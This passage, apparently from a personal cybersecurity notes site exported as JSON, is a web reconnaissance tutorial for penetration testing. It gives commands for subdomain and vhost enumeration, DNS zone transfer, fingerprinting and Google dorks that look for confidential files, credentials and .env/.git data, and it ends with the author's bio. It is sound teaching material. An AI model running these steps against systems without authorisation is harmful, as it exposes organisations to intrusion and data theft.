backup files, git files, and internal documentations.\nAnalzying the attack surface: Finding vulnerabilities and configurations which can be used to extract informations or obtain a shell into the server.\nGather Intelligence: Identifying user principal name, email addresses, and patterns that can be exploited.\n\nIt’s possible to do these stages actively or passively. If we choose actively it requires us to directly communicate with the server by launching Nmap, Fuzzing, Web Spidering, and so on. And if we choose passively it consists of using third party services such as Google, WHOIS, Web Archive, and Code Repositories.\nWHOIS\nWHOIS is a database that stores informations such as registrar, registrar contact, administrative contact, and nameserver about different domain names.\nWHOISwhois &#039;&lt;RHOST&gt;&#039;\nWith the informations obtained from the WHOIS it’s possible for us to launch a social engineering attack, phishing attack, and understand the services the company uses.\nSubdomains\nSubdomains is commonly used by organizations to access internal and external web applications. In some instances these subdomains can be running legacy or vulnerable web applications that can be exploited by threat actors. It’s possible for us to find all organizations subdomains using different tools such as dnsenum/ffuf/assetfinder.\nSubdomainsdnsenum --enum &#039;&lt;RHOST&gt;.com&#039; -f /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r\nIt’s important to use different wordlists to enumerate the subdomains as a single list may not be able to find all the subdomains. DNS Zone Transfer is commonly used for copying all DNS records from primary zone to secondary zone. If the DNS is misconfigured it allows threat actors to use DNS Zone Transfer to obtain all DNS records.\nSubdomains# 1. Getting nameservers\ndig ns &#039;&lt;RHOST&gt;&#039;\n \n# 2. Exploiting DNS zone transfer\ndig axfr &#039;&lt;RHOST&gt;&#039; &#039;@&lt;NAMESERVER&gt;&#039;\nDNS Zone Transfer is common in organizations as IT-administrators may not be familiar with best security practices for it. However, for threat actors it allows them to obtain all the subdomains and IP addresses of our web application which is extremely valuable.\nVHOST\nVirtual Host (VHOST) is a configuration that comes with Apache, Nginx, and IIS that allows us to host multiple of websites using single host. There are three types of Virtual Hosting:\n\nName-Based Virtual Hosting: This method relies on HTTP Post Header to distinguish between different websites.\nIP-Based Virtual Hosting: This type assigns a unique IP-address to each website hosted on the server. This is preferred option as each websites are isolated from each other.\nPort-Based Virtual Hosting: The different websites are assigned ports on the same IP-address. This method requires the user to use a specific port to access the different websites.\n\nIt’s possible for us to enumerate these virtual host configurations using tools such as gobuster, feroxbuster, and ffuf. Here’s a overview of the different commands.\nVHOST# Gobuster: Finding VHOST\ngobuster vhost -u &#039;http://&lt;RHOST&gt;:&lt;RPORT&gt;&#039; -w &#039;/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt&#039; --append-domain -t 100\n \n# Ffuf: Finding VHOST\nffuf -u &#039;http://&lt;RHOST&gt;:&lt;RPORT&gt;&#039; -H &#039;Host: FUZZ.&lt;RHOST&gt;.com&#039; -w &#039;/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.tx&#039;\nIt’s worth running the different commands as gobuster is excellent for finding virtual hosts but ffuf is also great for finding subdomains which gobuster may have missed. It’s also worth running different wordlists against our targets as other penetration testers more likely already ran the common wordlists against target.\nFingerprinting\nFingerprinting is about finding out the different technologies a web application uses. This is about finding out the web server, operating system, and software components that the web application as that allows us to search for vulnerabilities for these technologies. Here are some technologies that can be useful to obtain these informations:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nToolDescriptionWappalyzerIdentifies a wide range of technologies including CMS, Frameworks, and analytics and much more…BuiltWithinProvides detailed report about the technology stack.WhatWebUses vast database of signatures to identify web technologies.NmapScripts can be used for obtaining fingerprinting informations.NetcraftProvides detailed reports on a website’s technology, hosting provider, and security posture.wafw00fHelps determining the WAF is present and the type of configuration.\nWe can use the following commands on our machines to also obtain these informations.\nFingerprinting# Banner Grabbing\ncurl -I &#039;&lt;RHOST&gt;&#039;\n \n# Detecting WAF\nwafw00f &#039;&lt;RHOST&gt;&#039;\n \n# Detecting software components of web application\nnikto -h &#039;&lt;RHOST&gt;&#039; -Tuning b\nCrawling\nCrawling (Spidering) is a automated bot that goes through different sites and collect links and extracts the informations from these links. The recommended algorithms for crawlers are Breadth-First and Depth-First. It’s recommended to use Breadth-First algorithm if you need a broad overview of the web application but if you need specific content and dig deep into the infrastructure the Depth-First algorithm is recommended. The Burp Suite Spider and ReconSpider is excellent for crawling web applications.\nCrawlingReconSpider &#039;http://&lt;RHOST&gt;&#039;\nCrawlers can be useful for obtaining API keys, configuration files, backup files, error logs, backup logs. In some instances it might be able to discover hidden urls and find the version of component and the software the website is powered with. It’s important to note that majority of crawlers can be blocked with robots.txt file.\nSearch Engines\nSearch Engines is a great way of obtaining email addresses, credentials, confidential documents, and hidden files and folders. We can use the Google Hacking Database to create specific queries for our needs. Here are some queries that is possible for us to create.\nSearch Engines# Finding .pdf files\nsite:&#039;http://&lt;RHOST&gt;&#039; intext:&#039;confidential document&#039; filetype:&#039;pdf&#039;\n \n# Finding login pages\nsite:&#039;http://&lt;RHOST&gt;&#039; inurl:&#039;login&#039;\n \n# Finding configuration files\nsite:&#039;http://&lt;RHOST&gt;&#039; (intext:&#039;.env&#039; OR intext:&#039;.git&#039;)\nThis is a great way of obtaining information about a target in a passively way because there is no way of detecting us. It’s also a possibility that Google has indexed confidential data which can be valuable for us.\nWayBackMachine\nWayBackMachine is a snapshot database for web application. It allows us to access old version of the web application and in some instances we might be able to obtain confidential documents, credentials, and API keys by inspecting the old version of the application."},"Penetration-Testing/index":{"slug":"Penetration-Testing/index","filePath":"Penetration Testing/index.md","title":"Penetration Testing","links":[],"tags":[],"content":""},"index":{"slug":"index","filePath":"index.md","title":"Home","links":["Certifications/"],"tags":[],"content":"About Me\nHey, I’m Husenjan!\nI’m currently working on developing my skills in cyber security and programming as these things fascinates me. While developing my skills in these fields, I decided to create articles where I share my knowledge, experiences and solutions to help others.\nIf you’re interested about my background, I’m a 24 years old who mostly spends his time learning new things in cyber security and programming to hopefully someday become a chief information security officer for an organization to protect their assets from threats.  I also currently hold multiple of certifications and I’m working towards obtaining more to further increase my knowledge!\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nObtainedIn ProgressTodo GoalsAZ-900, MS-900, SC-900, AZ-104, AZ-500, AZ-305, MD-102, MS-102, OSCPCPTS, CWEE, and CAPEOSEP, OSED, OSWE, OSMR, and OSEE\nIt may seem as I’m collecting these certifications as pokemons but these certifications contains information’s from incredible people with tons of experience in cyber security which I’m excited to learn from. If you’re interested in knowing more about my experience with getting these certifications please check out Certifications.\nThank you for reading through the about me section!"}}